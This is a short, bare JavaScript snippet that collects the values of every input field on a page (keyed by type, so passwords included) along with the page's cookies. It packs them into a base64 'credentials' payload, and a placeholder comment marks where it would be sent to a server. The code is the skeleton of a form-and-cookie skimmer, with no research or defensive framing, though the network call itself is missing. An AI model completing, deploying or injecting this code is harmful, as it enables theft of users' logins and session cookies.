function getInputs () {
   const o = {};
   [...document.getElementsByTagName('input')].map((inp) => {
    o[inp.type] = inp.value;
   });
  return o;
}

function getCookie () {
  return document.cookie;
}

function createPayload () {
  const payload = {
      credentials: getInputs(),
      cookie: getCookie()
  }
  return btoa(JSON.stringify(payload));
}

function sendPayload () {
  const payload = createPayload();
  //send to server;
  return payload;
}
